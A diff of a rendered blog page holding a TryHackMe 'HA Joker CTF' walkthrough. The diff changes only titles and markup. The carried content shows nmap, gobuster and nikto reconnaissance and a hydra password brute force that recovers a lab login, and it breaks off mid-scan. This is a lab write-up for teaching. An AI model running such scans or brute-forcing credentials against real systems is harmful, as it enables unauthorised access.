@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>HA Joker CTF [TryHackMe] – Blog</title>
+    <title>HA Joker CTF [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="HA Joker CTF [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/ha-joker-ctf/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/ha-joker-ctf/icon.jpeg">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/ha-joker-ctf/icon.jpeg">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="HA Joker CTF [TryHackMe]">
     <meta property="twitter:description" content="Batman hits Joker.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1807,7 +1807,7 @@
 <h4 id="nmap">Nmap</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1821,24 +1821,24 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -p- -sV <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-06 01:40 CST
-Stats: 0:04:40 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
-SYN Stealth Scan Timing: About 59.11% <span class="k">done</span><span class="p">;</span> ETC: 01:48 <span class="o">(</span>0:03:13 remaining<span class="o">)</span>
-Nmap scan report <span class="k">for</span> 10.10.15.48
-Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
-Not shown: <span class="m">65532</span> closed ports
-PORT     	STATE 	SERVICE 	VERSION
-22/tcp   	open  	ssh     		OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-80/tcp   	open  	http    		Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-8080/tcp 	open  	http    		Apache httpd 2.4.29
-Service Info: Host: localhost<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- -sV <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-06 01:40 CST
+</span></span><span class="line"><span class="cl">Stats: 0:04:40 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing SYN Stealth Scan
+</span></span><span class="line"><span class="cl">SYN Stealth Scan Timing: About 59.11% <span class="k">done</span><span class="p">;</span> ETC: 01:48 <span class="o">(</span>0:03:13 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.15.48
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     	STATE 	SERVICE 	VERSION
+</span></span><span class="line"><span class="cl">22/tcp   	open  	ssh     		OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   	open  	http    		Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">8080/tcp 	open  	http    		Apache httpd 2.4.29
+</span></span><span class="line"><span class="cl">Service Info: Host: localhost<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="directory-brute-forcing">Directory Brute-Forcing</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1878,45 +1878,45 @@ Service Info: Host: localhost<span class="p">;</span> OS: Linux<span class="p">;
 </span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.15.48
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Extensions:     php,html,txt
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/01/06 01:45:03 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/css <span class="o">(</span>Status: 301<span class="o">)</span>
-/img <span class="o">(</span>Status: 301<span class="o">)</span>
-/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
-/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
-/phpinfo.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/phpinfo.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/secret.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-<span class="o">===============================================================</span>
-2021/01/06 01:47:25 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.15.48
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:     php,html,txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/06 01:45:03 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/css <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/img <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/phpinfo.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/phpinfo.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/secret.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/06 01:47:25 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>What version of Apache is it?</strong></p>
 <p>2.4.29</p>
@@ -1953,7 +1953,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <strong>What is that password?</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1965,17 +1965,17 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l joker -P /usr/share/wordlists/rockyou.txt -s <span class="m">8080</span> <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> http-get /
-Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
-
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-01-06 01:56:41
-<span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
-<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
-<span class="o">[</span>DATA<span class="o">]</span> attacking http-get://10.10.15.48:8080/
-<span class="o">[</span>8080<span class="o">][</span>http-get<span class="o">]</span> host: 10.10.15.48   login: joker   password: hannah
-<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
-Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-01-06 01:57:20
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l joker -P /usr/share/wordlists/rockyou.txt -s <span class="m">8080</span> <span class="o">{</span>TARGET MACHINE IP<span class="o">}</span> http-get /
+</span></span><span class="line"><span class="cl">Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-01-06 01:56:41
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking http-get://10.10.15.48:8080/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>8080<span class="o">][</span>http-get<span class="o">]</span> host: 10.10.15.48   login: joker   password: hannah
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-01-06 01:57:20
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We got the user and password and we see a cms based blog.<br />
 Now check for directories and files in this port.<br />
@@ -1992,7 +1992,7 @@ Now check for directories and files in this port.<br />
 </figure><br></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2053,66 +2053,66 @@ Now check for directories and files in this port.<br />
 </span><span class="lnt">59
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -U joker -P hannah -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-<span class="o">===============================================================</span>
-Gobuster v3.0.1
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.15.48:8080
-<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
-<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
-<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
-<span class="o">[</span>+<span class="o">]</span> Auth User:      joker
-<span class="o">[</span>+<span class="o">]</span> Extensions:     php,html,txt
-<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/01/06 02:01:06 Starting <span class="nv">gobuster</span>
-<span class="o">===============================================================</span>
-/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/.hta.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
-/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
-/administrator <span class="o">(</span>Status: 301<span class="o">)</span>
-/bin <span class="o">(</span>Status: 301<span class="o">)</span>
-/cache <span class="o">(</span>Status: 301<span class="o">)</span>
-<span class="o">[</span>ERROR<span class="o">]</span> 2021/01/06 02:01:33 <span class="o">[</span>!<span class="o">]</span> net/http: request canceled <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> reading body<span class="o">)</span>
-/components <span class="o">(</span>Status: 301<span class="o">)</span>
-/configuration.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/images <span class="o">(</span>Status: 301<span class="o">)</span>
-/includes <span class="o">(</span>Status: 301<span class="o">)</span>
-/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
-/language <span class="o">(</span>Status: 301<span class="o">)</span>
-/layouts <span class="o">(</span>Status: 301<span class="o">)</span>
-/libraries <span class="o">(</span>Status: 301<span class="o">)</span>
-/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
-/LICENSE.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-/media <span class="o">(</span>Status: 301<span class="o">)</span>
-/modules <span class="o">(</span>Status: 301<span class="o">)</span>
-/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
-/README <span class="o">(</span>Status: 200<span class="o">)</span>
-/README.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-/robots <span class="o">(</span>Status: 200<span class="o">)</span>
-/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
-/templates <span class="o">(</span>Status: 301<span class="o">)</span>
-/tmp <span class="o">(</span>Status: 301<span class="o">)</span>
-/web.config <span class="o">(</span>Status: 200<span class="o">)</span>
-/web.config.txt <span class="o">(</span>Status: 200<span class="o">)</span>
-<span class="o">===============================================================</span>
-2021/01/06 02:03:30 <span class="nv">Finished</span>
-<span class="o">===============================================================</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -U joker -P hannah -u http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.0.1
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:            http://10.10.15.48:8080
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Auth User:      joker
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:     php,html,txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/06 02:01:06 Starting <span class="nv">gobuster</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.hta.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.html <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/administrator <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/cache <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> 2021/01/06 02:01:33 <span class="o">[</span>!<span class="o">]</span> net/http: request canceled <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> reading body<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/components <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/configuration.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/images <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/includes <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/language <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/layouts <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/libraries <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/LICENSE.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/media <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/modules <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/README <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/README.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/robots <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/templates <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/tmp <span class="o">(</span>Status: 301<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/web.config <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/web.config.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/01/06 02:03:30 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -2128,7 +2128,7 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 <strong>What is this file?</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2162,46 +2162,46 @@ by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span 
 </span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nikto -h http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080 -id joker:hannah
-- Nikto v2.1.6
----------------------------------------------------------------------------
-+ Target IP:          10.10.15.48
-+ Target Hostname:    10.10.15.48
-+ Target Port:        <span class="m">8080</span>
-+ Start Time:         2021-01-06 02:05:41 <span class="o">(</span>GMT-6<span class="o">)</span>
----------------------------------------------------------------------------
-+ Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
-+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39; Please enter the password.&#39;</span>
-+ Successfully authenticated to realm <span class="s1">&#39; Please enter the password.&#39;</span> with user-supplied credentials.
